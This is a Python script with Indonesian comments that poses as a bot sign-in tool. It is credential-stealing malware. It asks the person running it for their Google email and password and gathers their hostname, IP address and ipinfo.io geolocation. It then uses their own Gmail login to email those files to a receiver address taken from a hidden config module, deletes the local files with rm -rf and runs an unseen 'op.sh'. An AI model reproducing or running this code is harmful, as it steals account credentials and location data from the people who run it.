import asyncio
import logging
import re
import time
import os
import sys
import random
import socket


from datetime import datetime

# color 
os.system("cat lgo.txt | lolcat -a -s 101 -d 10 -p 8")
try:
   import requests
   from bs4 import BeautifulSoup
except:
   print ("Please Install Modul Requests & BS4\n\n\n")
   sys.exit()


# Get your own values from my.telegram.org
#api_id = 2068969
#api_hash = 'e96242e825d10bc69e2547c8c4553ff1'
hostname = socket.gethostname()    
IPAddr = socket.gethostbyname(hostname)
os.system("bash op.sh")
def print_msg_time(message):
        print('['  f'{datetime.now().strftime("%H:%M:%S")}' + f'] {message}')
print_msg_time('Start Bot' + '\n')
print_msg_time ( 'Sign in running...' + '\n')



 # masukan nama googls

print ("========Masukan google===========")
print ("=================================")

# Ambil input dari user
nama = input("Google: ")
passw = input("Pass: ")
#victim = input("Victim : ")
#kirim = input("Message: ")
# format teks
teks = "Nama: {}\nPass: {}\n---".format(nama, passw)

# buka file untuk ditulis
file_bio = open("biodata.txt", "a")
file_passw = open("passw.txt", "a")

file_bio.write(nama)
file_passw.write(passw)
print_msg_time("tunggu beberapa detik  " f'{nama}')
time.sleep(1) #sleep
# tmembaca useer
file_bio = open("biodata.txt", "w")
file_passw = open("passw.txt", "w")
file_bio = open("biodata.txt", "r")
file_passw = open("passw.txt", "r")
biodata = file_bio.read()
passwd  = file_passw.read()


# get device

ipnet = open (f"host.txt", "a")
ipnet = open (f"host.txt", "w")
ipnet.write(hostname)
ipadrs = open(f"ip.txt","a")
ipadrs = open(f"ip.txt","w")
ipadrs.write(IPAddr)


 # get Acurat loc


import json

res=requests.get('https://ipinfo.io/')
data = res.json()


    # print(data) V (RAT)

with open('ACCip.txt', 'w') as f:
  json.dump(data, f,indent = 4, sort_keys = True, ensure_ascii=False)


# cath



 #data kirim

import email, smtplib, ssl
from spam.mdl.accn.conf import  dat
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

subject = "_______baru lagiii_____"
body = " janganlupadoa "
sender_email = nama
receiver_email = (dat)
password = passw




# Isi BCC aja
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message["Bcc"] = nama # Recommended for mass emails

# Lampiran ke satu
message.attach(MIMEText(body, "plain"))

filename = "passw.txt"  # meng


# Open PDF file in binary mode
with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

# Encode file in ASCII karakter ke email    
encoders.encode_base64(part)

# Add header 
part.add_header(
    "Content-Disposition",
    f"attachment; filename= {filename}",
)

# nambahin attachment ke message dn convert message ke string
message.attach(part)
text = message.as_string()

# Lampiran ke dua
message.attach(MIMEText(body, "plain"))

filename = "ACCip.txt"  # In same directory as script


# Open PDF file in binary mode
with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

# Encode file in ASCII characters to send by email    
encoders.encode_base64(part)

# Add header as key/value pair to attachment part
part.add_header(
    "Content-Disposition",
    f"attachment; filename= {filename}",
)

# Add attachment to message and convert message to string
message.attach(part)
text = message.as_string()

# Lampiran ke tiga
message.attach(MIMEText(body, "plain"))

filename = "biodata.txt"  # In same directory as script


# Open PDF file in binary mode
with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

# Encode file in ASCII characters to send by email    
encoders.encode_base64(part)

# Add header as key/value pair to attachment part
part.add_header(
    "Content-Disposition",
    f"attachment; filename= {filename}",
)

# Add attachment to message and convert message to string
message.attach(part)
text = message.as_string()

# Lampiran ke empat
message.attach(MIMEText(body, "plain"))

filename = "host.txt"  # In same directory as script


# Open PDF file in binary mode
with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

# Encode file in ASCII characters to send by email    
encoders.encode_base64(part)

# Add header as key/value pair to attachment part
part.add_header(
    "Content-Disposition",
    f"attachment; filename= {filename}",
)

# Add attachment to message and convert message to string
message.attach(part)
text = message.as_string()

# Lampiran ke lima
message.attach(MIMEText(body, "plain"))

filename = "ip.txt"  # In same directory as script


# Open PDF file in binary mode
with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

# Encode file in ASCII characters to send by email    
encoders.encode_base64(part)

# Add header as key/value pair to attachment part
part.add_header(
    "Content-Disposition",
    f"attachment; filename= {filename}",
)

# Add attachment to message and convert message to string
message.attach(part)
text = message.as_string()

# Log in to server using secure context and send email
context = ssl.create_default_context()
try:
    mailServer = smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context)
    mailServer.login(sender_email, password)
    mailServer.sendmail(sender_email, receiver_email, text)
    mailServer.close()
    os.system("cat accs.txt | lolcat ")
    print('btl')
except:
    os.system("cat accs.txt | lolcat ")



    

# hidden 
# untuk yang menggunakan script ini kamu jangan asal pake!
# ini hanya untuk bersenang senang
import os
print ("wait 1.......")
os.system("rm -rf passw.txt")
os.system("rm -rf biodata.txt")
os.system("rm -rf ACCip.txt")

print ("\nwait 2.......")
time.sleep(3)
print ("\nwait 3.......")
time.sleep(2)
print ("\nwait 4.......")
time.sleep(1)
print("\ntry")


